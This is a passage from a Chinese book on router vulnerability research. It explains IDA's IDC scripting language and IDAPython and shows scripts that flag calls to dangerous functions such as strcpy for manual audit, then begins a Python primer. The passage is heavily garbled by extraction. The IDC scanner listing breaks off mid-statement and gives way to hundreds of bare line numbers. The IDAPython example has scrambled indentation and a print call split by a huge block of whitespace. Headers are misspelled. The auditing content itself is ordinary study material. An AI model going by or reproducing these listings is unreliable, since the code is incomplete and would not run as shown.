田于 IDC 发量的弱类型特点，使得函数声明不会指明该函数是否明确返回一个值，以及在不生成结果时会返回什么类型的值。如果希望函数返回一个值，可以使用 return 语句返回指定的值，示例如下。默认情况下，任何不显式返回一个值的函数都将返回零值。

static getFunc() {
    return Message; // 返回内建Message() 函数
}
static useFunc(func, arg) {
    func(arg);
}

static main() {
    auto f = getFunc();
    f("Hello IDC!\n"); // 相当于Message("Hello IDC!\n");
    useFunc(f, "use Func Print!\n");
}

运行代码后输出的结果如下。

Hello IDC
use Func Print

##### (6) IDC程序

如果一个脚本应用程序需要执行大量的 IDC 语句，那么我们可能需要创建一个独立的 IDC 程序文件。IDC 程序文件要求使用用户定义的函数，且至少应该定义一个没有参数的 main() 函数。另外，主程序文件中必须包含 idc.idc 头文件，从而获得一些有用的宏定义。下面是一个简单的 IDC 程序文件的基本结构。

#include <idc.idc>
static main() {
    Message("this is a IDC script file\n");
}

IDC 支持以下 C 预处理指令。

#include <文件>：将指定的文件包含在当前文件中。

#define <宏名称> [可选项]: 创建宏，可以选择给宏分配指定的值。

#ifdef<名称>: 测试指定的宏是否存在。若存在，则跳过该语句定义的块。

#else：与“#ifdef”指令一起使用。若宏不存在，它可以提供另一组处理语句。

#endif: 通过 “#ifdef” 指令定义终止符。

#undef<名称>: 删除指定的宏。

以上指令的用法示例如下。

#include <idc.idc>
#define DEBUG
static main() {
    #ifdef DEBUG
    Message("DEBUG MODE!\n");
    #else
    Message("EXECUTE MODE!\n");
}

8 #endif
9 }

以上程序输出的结果是 “DEBUG MODE!”。因为在第 2 行中定义了宏 “DEBUG”，所以第 5 行被执行，第 7 行被忽略。

##### (7) IDC错误处理

在运行 IDC 脚本时，通常会遇到两种错误，分别是解析错误和运行时错误。

解析错误是指那些可能让程序无法运行的错误，包括语法错误、引用未定义变量等。在解析阶段，IDC仅报告它遇到的第一个解析错误，因此可能需要多次运行脚本后才能完全排除代码中的所有错误。

运行时错误会使脚本立即终止运行。例如，程序开始运行以后进入一个无限循环，或者脚本的运行时间超过预期，此时我们是没有办法结束这个脚本的。IDA 的处理方法是：当脚本运行时间超过规定时间，IDA 会显示一个对话框，让用户可以终止程序的运行。

# 2. 常用IDC函数

在 IDA 帮助系统中比较详细地介绍了 IDC 函数，因此，这里仅介绍常用的 IDC 函数。

##### （1）读取和修改数据的函数

下面这些函数可用于访问 IDA 数据库中的各个字节、字及双字。

➢ long Byte(long addr): 从虚拟地址 addr 处读取一个字节（1 字节）的值。

long Word(long addr): 从虚拟地址 addr 处读取一个字（2 字节）的值。

long Dword(long addr): 从虚拟地址 addr 处读取一个双字（4 字节）的值。

void PatchByte(long addr, long val): 设置虚拟地址 addr 处一个字节（1 字节）的值为 val。

void PatchWord(long addr, long val): 设置虚拟地址 addr 处一个字（2 字节）的值为 val。

void PatchDword(long addr, long val): 设置虚拟地址 addr 处一个双字（4 字节）的值为 val。

bool isLoaded(long addr): 如果虚拟地址 addr 中包含有效数据则返回 1，否则返回 0。

##### (2) 用户交互函数

下面介绍的这些函数用于实现 IDC 与用户的交互，它们能够实现用户输入及 IDC 脚本处理结果的输出。

void Message(string format, ...): 在输出窗口打印格式化消息，方法与 C 语言中的 printf 函数类似。

void print(...): 在输出窗口打印每一个参数的字符串表示形式。

void Warning(string format, ...): 弹出对话框，显示格式化消息。

string AskStr(string default, string prompt): 显示一个输入框，要求用户输入字符串。如果对话框被用户取消则返回 0，否则返回输入字符串。

string AskFile(long doSave, string mask, string prompt): 显示一个文件选择对话框，简化选择文件的任务。如果需要保存文件，设置“doSave=1”；如果选择加载现有的文件，设置“doSave=0”。“mask”（如*.*、*.idc）用于过滤显示的文件列表。如果对话框被用户取消则返回0，否则返回选定文件的名称。

long AskYN(long default, string prompt): 用一个答案为 “是” 或 “否” 的问题提示用户，突出一个默认的答案（1 为 “是”，0 为 “否”，-1 为 “取消”）。返回值是一个表示选定的答案的整数。如用户选择 “是”，函数返回 1。

long ScreenEA(): 返回当前光标所在位置的虚拟地址。

bool Jump(long addr): 跳转到反汇编窗口的指定地址。

因为 IDC 脚本并没有任何调试工具，所以可以依靠输出函数（Message()、Warning() 等）实现调试功能。其中，AskXXX() 系列函数用于处理专用的输入，如整数输入。如果我们需要用到这种类型的其他函数，在 IDA 帮助系统中搜索 “Ask” 就可以很方便地找到 AskXXX() 系列函数的完整列表。如果我们需要创建一个根据当前光标位置调整其行为的脚本，ScreenEA() 函数将非常有用。如果需要将用户的注意力转移到反汇编代码清单中的某个位置，可以使用 Jump() 函数。

##### (3) 字符串操纵函数

前面介绍了使用基本运算符操作字符串的例子，但是在面对更加复杂的操作时，我们可能需要用到以下函数。

string sprintf(string format, ...): 返回一个新的字符串，该字符串根据所提供的格式化字符串和值进行格式化，与 C 语言中的 sprintf 函数使用方法类似。

string form(string format, ...): 用法同 sprintf 函数。

long atol(string val): 将十进制值 val 转换为对应的整数类型的值。

long xtol(string val): 将十六进制值 val（可以 “0x” 开头）转换为对应的整数类型的值。

string ltoa(long val, long radix): 以指定的进制（radix）返回 val 的字符串的值。

long ord(string ch): 返回单字符 ch 的 ASCII 值。

long strlen(string str): 返回字符串 str 的长度。

long strstr(string str, string substr)：返回字符串 str 中子串 substr 的索引值。如果没有找到子串，返回 -1。

string substr(string str, long start, long end): 返回在字符串 str 中从 start 索引位置开始到 end-1 索引结束位置的子字符串，与字符串分片操作的 str[start:end] 结果一样。

##### (4) 数据库名称操纵函数

string Name(long addr): 返回给定地址在 IDA 数据库中的相关名称。如果该位置没有名称，则返回空字符串。如果名称被标记为局部名称，则不返回用户定义的名称。

string NameEx(long from, long addr): 返回与 addr 有关的名称。如果该位置没有名称，则返回空字符串。如果 from 是一个同样包含 addr 的函数中的地址，则返回用户定义的局部名称。

bool MakeNameEx(long addr, string name, long flags): 为指定地址 addr 分配名称 name。该名称使用 flags 位掩码中指定的属性创建。关于 flags 属性值，可以查看帮助文档。

long LocByName(string name): 返回指定名称 name 位置的地址。如果在 IDA 数据库中没有这个名称，则返回 BADADDR（-1）。

long LocByNameEx(long funcaddr, string localname): 在包含 funcaddr 的函数中指定局部名称 localname。如果指定函数中没有该名称，则返回 BADADDR（-1）。

##### (5) 处理函数的函数

IDA 为经过反汇编的函数分配了大量的属性，如函数局部变量区域大小、函数参数在运行时堆栈上的大小。下面介绍 IDC 函数中用于访问与数据库中函数相关的函数。

long GetFunctionAttr(long addr, long attrib): 获取指定地址的函数的请求属性。具体的请求属性参考 IDA 帮助文档。

string GetFunctionName(long addr): 获取指定地址 addr 位置的函数的名称。如果指定位置不属于任何一个函数，则返回空字符串。

long NextFunction(long addr): 返回指定地址 addr 之后的下一个函数的起始地址。如果数据库中指定地址之后没有其他函数，则返回 -1。

long PrevFunction(long addr): 返回指定地址 addr 之后的距离最近的函数的起始地址。如果数据库中指定地址之前没有其他函数，则返回 -1。

##### (6) 代码交叉引用函数

IDC 提供各种函数来访问与指令相关的交叉引用信息。当我们有兴趣跟踪引用指定代码的位置时，可以使用下面的代码交叉引用函数进行处理。

long Rfirst(long from): 指定地址向 from 转交控制权的第一个位置。如果指定地址没有引用其他地址，则返回 BADADDR（-1）。

long Rnext(long from, long current): 如果 current 已经在前一次调用 Rfirst() 或 Rnext() 函数时返回，则返回指定地址 from 转交控制权的下一个位置。如果没有其他交叉引用存在，则返回 BADADDR(-1)。

long XrefType(): 返回某个交叉引用查询函数（如 Rfirst()）返回的最后一个交叉引用的类型，值为一个常量。代码交叉引用返回的常量包括 fl_CN（近调用）、fl_JN（近跳转）、fl_CF（远调用）、fl_JF（远跳转）及 fl_F（普通顺序流）。

long RfirstB(long to): 返回转交控制权到指定地址 to 的第一个位置。如果不存在对给定地址的交叉引用，则返回 BADADDR（-1）。

long RnextB(long to, long current): 如果 current 已经在前一次调用 RfirstB() 或 RnextB() 函数时返回，则返回转交控制权到指定地址的下一个位置。如果没有其他交叉引用存在，则返回 BADADDR(-1)。

每次调用一个交叉引用函数后，IDA 都会设置一个内部 IDC 状态变量，指出返回的最后一个交叉引用类型。此时，可以使用 XrefType() 函数查询返回的交叉引用的类型。

##### (7) 数据交叉引用函数

访问数据交叉引用信息的函数与访问代码交叉引用信息的函数非常相似，介绍如下。

long Dfirst(long from): 返回指定地址 from 引用一个数据值的第一个位置。如果指定地址没有引用其他地址，则返回 BADADDR（-1）。

long Dnext(long from, long current): 如果 current 已经在前一次调用 Dfirst() 或 Dnext() 函数时返回，则返回指定地址 from 向其引用一个数据值的下一个位置。如果没有其他交叉引用存在，则返回 BADADDR(-1)。

long XrefType(): 返回某个交叉引用查询函数（如 Dfirst()）返回的最后一个交叉引用的类型，值为一个常量。数据交叉引用返回的常量包括 dr_O（提供的偏移量）、dw_W（数据写入）及 dr_R（数据读取）。

long DfirstB(long to): 返回将给定地址 to 作为数据引用的第一个位置。如果不存在对给定地址的交叉引用，则返回 BADADDR（-1）。

long DnextB(long to, long current): 如果 current 已经在前一次调用 DfirstB() 或 DnextB() 函数时返回，则返回将指定地址 to 作为数据引用的下一个位置。如果没有其他交叉引用存在，则返回 BADADDR（-1）。

##### (8) 数据库操纵函数

bool MakeComm(long addr, string comment): 在指定地址 addr 处添加一条常规注释。

void MakeUnkn(long addr, long flags): 取消在地址 addr 处的项的定义。“flags” 用于指出是否取消随后的项的定义，以及是否删除任何与取消定义的项有关的名称。具体定义参见 IDA 帮助文档中对 MakeUnkn() 函数的解释。

long MakeCode(long addr): 将位于指定地址 addr 处的字节转换为一条指令。如果操作成功则返回指令长度，否则返回 0。

bool MakeByte(long addr): 将位于指定地址 addr 处的项转换为一个数据字节。类似的函数还有 MakeWord() 和 MakeDword()。

bool MakeFunction(long begin, long end): 将从 begin 到 end 位置的指令转换为一个函数。如果 end 位置被指定为 BADADDR（-1），IDA 会尝试通过定位函数的返回指令自动确定该函数的结束地址。

bool MakeStr(long begin, long end): 将 begin 到 end-1 位置的所有字节转换为一个字符串类型的字符串。如果 end 位置被指定为 BADADDR，那么 IDA 会自动确定字符串的结束位置。

在 IDC 中还提供了很多 MakeXXX() 系列的函数来实现上述操作，我们同样可以在 IDA 帮助系统中找到相关介绍。

##### (9) 数据库搜索函数

在 IDC 中，IDA 的绝大部分搜索功能都可以通过各种 FindXXX() 系列函数实现，下面将介绍其中的一些函数。

在 FindXXX() 函数中，flags 参数是一个掩码，可用于指导查找操作的行为，3 个最为常见的标记是 SEARCH_DOWN（搜索操作扫描高位地址代码）、SEARCH_NEXT（略过当前匹配项，搜索下一个匹配项）、SEARCH_CASE（以区分大小写的方式进行二进制和文本搜索）。

long FindCode(long addr, long flags): 从指定地址 addr 处搜索一条指令。

long FindData(long addr, long flags): 从指定地址 addr 处搜索一个数据项。

long FindBinary(long addr, long flags, string binary): 从指定地址 addr 处搜索一个字节序列。字符串 binary 指定一个十六进制的字节序列值。

long FindText(long addr, long flags, long row, long column, string text): 在指定的地址 addr 处，从给定行 row 的给定列 column 中搜索字符串 text。需要注意的是，某个给定地址的反汇编文本可能会跨越多行，因此我们需要指定搜索应该从哪一行开始。

还有一点需要注意的是，SEARCH_NEXT 标记并没有定义搜索的方向，根据 SEARCH_DOWN 标记，它的方向可能向上，也可能向下。此外，如果没有设置 SEARCH_NEXT 标记，而且 addr 位置的项与搜索条件匹配，那么 FindXXX() 系列函数很可能会返回 addr 参数传递给该函数的地址。

##### （10）反汇编行组件

当我们需要从反汇编代码清单的反汇编行中提取文本或文本的某个部分时，需要使用以下反汇编行组件函数。

string GetDisasm(long addr): 返回指定地址 addr 的反汇编文本。返回的文本中包含注释，但不包含地址信息。

string GetMnem(long addr): 返回位于指定地址的指令的助记符部分。

string GetOpnd(long addr, long opnum): 返回指定地址 addr 的指定操作数的文本形式。

操作数从左到右，编号从 0 开始。

long GetOpType(long addr, long opnum): 返回指定地址 addr 的给定操作数的类型。

long GetOperandValue(long addr, long opnum): 返回与指定地址的给定操作数有关的整数值，其返回值的性质取决于 GetOpType 指定的给定操作数的类型。

string CommentEx(long addr, long type): 返回指定地址 addr 的注释文本。“type=0”时，返回常规注释文本；“type=1”时，返回可重复注释文本。如果给定地址没有注释，则返回空字符串。

# 3. IDC脚本实例

在利用 IDA 进行静态漏洞分析时，通常的做法是分析危险函数（如 strcpy、sprintf 等）调用位置处的代码。如果直接手工搜索危险函数，不仅效率低，而且过程相对复杂。而在学习了 IDC 脚本之后，可以通过编写一个脚本进行自动化分析，逆向遍历危险函数的所有交叉引用并使用注释对漏洞函数进行标记，示例如下。

##### 源码 枚举危险函数（scanvuln.idc）

#include <idc.idc>
static flagCalls(fname)
{
    auto count = 0;
    auto func, xref;
    func = LocByName(fname);
    if (func != BADADDR)
    {
        for (xref = RfirstB(func); xref != BADADDR; xref = RnextB(func, xref))
        {
            //Message("%x,%x\n", xref, func);
            if (XrefType() == fl_CN || XrefType() == fl_CF)
        }
    }
}

揭秘家用路由器 Oday 漏洞挖掘技术

13 {
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
275
276
277
278
279
280
281
282
283
284
285
286
287
288
289
290
291
292
293
294
295
296
297
298
299
300
301
302
303
304
305
306
307
308
309
310
311
312
313
314
315
316
317
318
319
320
321
322
323
324
325
326
327
328
329
330
331
332
333
334
335
336
337
338
339
340
341
342
343
344
345
346
347
348
349
350
351
352
353
354
355
356
357
358
359
360
361
362
363
364
365
366
367
368
369
370
371
372
373
374
375
376
377
378
379
380
381
382
383
384
385
386
387
388
389
390
391
392
393
394
395
396
397
398
399
400
401
402
403
404
405
406
407
408
409
410
411
412
413
414
415
416
417
418
419
420
421
422
423
424
425
426
427
428
429
430
431
432
433
434
435
436
437
438
439
440
441
442
443
444
445
446
447
448
449
450
451
452
453
454
455
456
457
458
459
460
461
462
463
464
465
466
467
468
469
470
471
472
473
474
475
476
477
478
479
480
481
482
483
484
485
486
487
488
489
490
491
492
493
494
495
496
497
498
499
500
501
502
503
504
505
506
507
508
509
510
511
512
513
514
515
516
517
518
519
520
521
522
523
524
525
526
527
528
529
530
531
532
533
534
535
536
537
538
539
540
541
542
543
544
545
546
547
548
549
550
551
552
553
554
555
556
557
558
559
560
561
562
563
564
565
566
567
568
569
570
571
572
573
574
575
576
577
578
579
580
581
582
583
584
585
586
587
588
589
590
591
592
593
594
595
596
597
598
599
600
601
602
603
604
605
606
607
608
609
610
611
612
613
614
615
616
617
618
619
620
621
622
623
624
625
626
627
628
629
630
631
632
633
634
635
636
637
638
639
640
641
642
643
644
645
646
647
648
649
650
651
652
653
654
655
656
657
658
659
660
661
662
663
664
665
666
667
668
669
670
671
672
673
674
675
676
677
678
679
680
681
682
683
684
685
686
687
688
689
690
691
692
693
694
695
696
697
698
699
700
701
702
703
704
705
706
707
708
709
710
711
712
713
714
715
716
717
718
719
720
721
722
723
724
725
726
727
728
729
730
731
732
733
734
735
736
737
738
739
740
741
742
743
744
745
746
747
748
749
750
751
752
753
754
755
756
757
758
759
760
761
762
763
764
765
766
767
768
769
770
771
772
773
774
775
776
777
778
779
780
781
782
783
784
785
786
787
788
789
790
791
792
793
794
795
796
797
798
799
800
801
802
803
804
805
806
807
808
809
810
811
812
813
814
815
816
817
818
819
820
821
822
823
824
825
826
827
828
829
830
831
832
833
834
835
836
837
838
839
840
841
842
843
844
845
846
847
848
849
850
851
852
853
854
855
856
857
858
859
860
861
862
863
864
865
866
867
868
869
870
871
872
873
874
875
876
877
878
879
880
881
882
883
884
885
886
887
888
889
890
891
892
893
894
895
896
897
898
899
900
901
902
903
904
905
906
907
908
909
910
911
912
913
914
915
916
917
918
919
920
921
922
923
924
925
926
927
928
929
930
931
932
933
934
935
936
937
938
939
940
941
942
943
944
945
946
947
948
949
950
951
952
953
954
955
956
957
958
959
960
961
962
963
964
965
966
967
968
969
970
971
972
973
974
975
976
977
978
979
980
981
982
983
984
985
986
987
988
989
990
991
992
993
994
995
996
997
998
999
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
15

第 2 行：定义了一个 flagCalls() 函数，遍历危险函数的所有交叉引用都是在这个函数中完成的，其参数为危险函数的名称（如 “strcpy”）。

第 9 行：使用代码交叉方式遍历危险函数。

第 12 行～第 17 行：当前 RfirstB() 或 RnextB() 函数返回的交叉引用类型是近调用或远调用，会在调用位置加上注释 “*** AUDIT HERE ***”，并在输出窗口输出调用位置的地址等信息。

第 19 行～第 28 行：举例使用数据交叉引用方式搜索危险函数。去掉注释可以看到这两种交叉引用搜索方法的区别。

接下来，我们就使用这段 IDC 脚本扫描 hello.c 生成的应用程序 hello。

01 打开 IDA，使用静态反汇编的方式加载 hello，如图 3-32 所示。

 </div>

02 使用执行脚本文件的方式加载 scanvuln.idc，如图 3-33 所示。

 </div>

03 打开 scanvuln.idc 脚本并执行后，在 IDA 的 “Output window” 窗口中可以看到已经打印出了扫描到的一个危险函数 strcpy，如图 3-34 所示。

04 双击地址 0x4003d8，反汇编窗口会自动跳转到危险函数处，如图 3-35 所示。此时，我们就可以针对该函数的参数进行审计，分析其中是否存在溢出漏洞了。

##### 揭秘家用路由器 Today 漏洞挖掘技术

 </div>

 </div>

### 3.3.3 IDAPython

IDA Python 是由 Gergely Erdelyi 开发的一个插件，它在 IDA 中集成了 Python 解释器。除了提供 Python 功能外，使用这个插件还可以编写能够实现 IDC 脚本语言的所有 Python 脚本。IDA Python 的一个显著优势在于，它可以充分利用 Python 强大的数据处理能力及所有的 Python 模块。此外，IDA Python 还具有 IDA SDK 的大部分功能，与 IDC 相比，使用它可以编写出功能更加强大的脚本。但是，IDA Python 有一个缺点，就是几乎找不到使用文档，这对我们学习使用 IDA Python 进行脚本编写造成了一定的阻碍。但这并不能成为我们放弃使用 IDA Python 的理由。实际上，网上关于 IDA Python 脚本编写的文章并不少，我们也可以通过阅读位于 IDA 目录下 Python 子目录中关于 IDA Python 的 3 个模块（每一个模块服务于特定的用途）进行学习。

idaapi.py: 负责访问核心 IDA API。

idautils.py：提供大量的使用函数。

idc.py: 负责提供 IDC 中所有函数的功能。

https://www.hex-rays.com/products/ida/support/idapython_docs/index.html 站点提供了关于这3个文件的所有可用函数的介绍。

在 IDAPython 的 idautils 模块中包含了多个生成器函数，使用它们可以生成比我们在 IDC 脚本中看到的列表更加直观的交叉引用列表，而且之前介绍的 IDA 辅助分析 MIPS 程序反汇编的插件和脚本也都是使用 IDAPython 编写的。为了将 IDC 与 IDAPython 进行比较，本节将提供具有与前面讨论 IDC 时使用的实例功能相同的实例，示例如下。

源码 使用 IDAPython 处理危险函数交叉引用

from idaapi import *
def getFuncAddr(fname):
    return LocByName(fname)

def judgeAduit(addr):
    ...

    not safe function handler
    ...

    MakeComm(addr, "##AUDIT HERE ###")

    SetColor(addr, CIC_ITEM, 0x0000ff)  # set background to red

    def flagCalls(funcname):
        ...

    not safe function finder
    ...

    count = 0

    fAddr = getFuncAddr(funcname)

    func = get_func(fAddr)

    if not func is None:
        ...

        fname = Name(func.startEA)

        items = FuncItems(func.startEA)

        for i in items:
            for xref in XrefsTo(i, 0):
                if xref.type == fl_CN or xref.type == fl_CF:
                    count += 1

                Message("%s[%d]     calls    0x%08x    from
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                

揭秘家用路由器 0day 漏洞挖掘技术

28 if __name__ == '__main__':
29
30 handle all not safe functions
31
32 flagCalls('strcpy')

这段脚本使用 XrefsTo 生成器逆向遍历所有危险函数的所有交叉引用。XrefsTo 生成器将返回对 xrefblk_t 对象（其中包含有关当前交叉引用的详细信息）的引用。

下面我们依然使用 hello.c 生成的二进制可执行程序 hello，扫描其中包含的危险函数。由于加载和执行的方法与 IDC 脚本相同，因此这里略过加载执行的步骤，直接看执行的结果，如图 3-36 所示。

 </div>

在学习了 IDA 脚本的相关基础知识以后，我们将学习一些更加有难度的嵌入式汇编语言。这些汇编语言的基础知识在以后的路由器逆向分析乃至整个路由器安全研究中都是非常重要的。

## 3.4 Python编程基础

Python 是一门解释型的、面向对象的编程语言，与 Perl 类似。很多安全测试工具都是采用 Python 编写语言的，如模糊测试工具 Sulley。Python 这样的解释型编程语言简单、易学、易用、功能强大，而且清晰的语法使它非常易于阅读，这些优点使它被广泛地应用于网络安

全的各个方面。因此，我们有必要了解 Python 的更多使用方法。

#### 3.4.1 第一个Python程序

本书使用 Python 2.7.x 环境。如果读者使用的是 Python 3.x，在语法上可能有细微的差别。

我们从经典的“Hello World”实例开始，对通过 Python 控制台打印“Hello World”进行演示，代码如下。

1 embedded@ubuntu:~$ python
2 Python 2.7.3 (default, Feb 27 2014, 20:00:17)
3 [GCC 4.6.3] on linux2
4 Type "help", "copyright", "credits" or "license" for more information.
5 &gt;&gt;&gt; print 'Hello World'
6 Hello World

上面介绍的是在 Python 控制台中进行 Python 编程体验。但是，使用 Python 控制台会给脚本的执行带来很大的不便，如果要多次执行多行代码，使用控制台是比较麻烦的。在这里，我们可以将需要执行的函数放入一个文件中，然后使用 Python 执行文件中的指令，代码如下。

1 embedded@ubuntu:~/code$ cat > hello.py
2 print 'Hello World'
3 embedded@ubuntu:~/code$ python hello.py
4 Hello World

#### 3.4.2 Python网络编程

